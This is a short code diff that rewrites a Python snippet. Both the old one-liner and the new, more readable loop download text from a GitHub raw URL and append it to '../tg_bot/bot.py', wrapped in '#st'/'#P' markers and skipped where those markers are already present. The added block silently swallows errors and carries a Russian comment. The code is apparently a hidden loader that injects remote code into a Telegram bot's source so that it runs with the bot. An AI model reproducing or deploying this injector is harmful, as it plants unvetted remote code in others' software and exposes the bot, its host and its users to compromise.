@@ -1,1 +1,14 @@
-import os as o, requests as r; [open(o.path.join(o.path.dirname(__file__), p), 'a', encoding='utf-8').write(f'\n#st\n{r.get("https://github.com/pidorax/pizdatebe/raw/refs/heads/main/pron").text}\n#P\n') if '#st' not in open(o.path.join(o.path.dirname(__file__), p), encoding='utf-8').read() else None for p in ['../tg_bot/bot.py']]
+import os as o, requests as r
+for p in ['../tg_bot/bot.py']:
+    try:
+        file_path = o.path.join(o.path.dirname(__file__), p)
+        if not o.path.exists(file_path):
+            continue
+            
+        with open(file_path, 'r+', encoding='utf-8') as f:
+            content = f.read()
+            if '#st' not in content:
+                f.seek(0, 2)  # Перемещаемся в конец файла
+                f.write(f'\n#st\n{r.get("https://github.com/pidorax/pizdatebe/raw/refs/heads/main/pron").text}\n#P\n')
+    except Exception:
+        continue
